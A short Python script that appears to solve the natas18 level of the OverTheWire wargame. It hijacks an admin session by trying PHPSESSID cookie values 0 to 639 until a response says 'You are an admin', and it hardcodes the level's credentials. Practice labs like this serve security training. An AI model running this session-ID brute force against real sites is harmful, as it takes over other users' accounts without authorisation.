#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re
from string import *
from time import *

characters = lowercase + uppercase + digits

username = 'natas18'
password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

for session_id in range (0,640):

	response = session.post(url,cookies = {"PHPSESSID" : str(session_id)}, auth = (username, password))
	content = response.text

	if ("You are an admin" in content):
		print "Got it", session_id
		print content
		break
	else :
		print "trying", session_id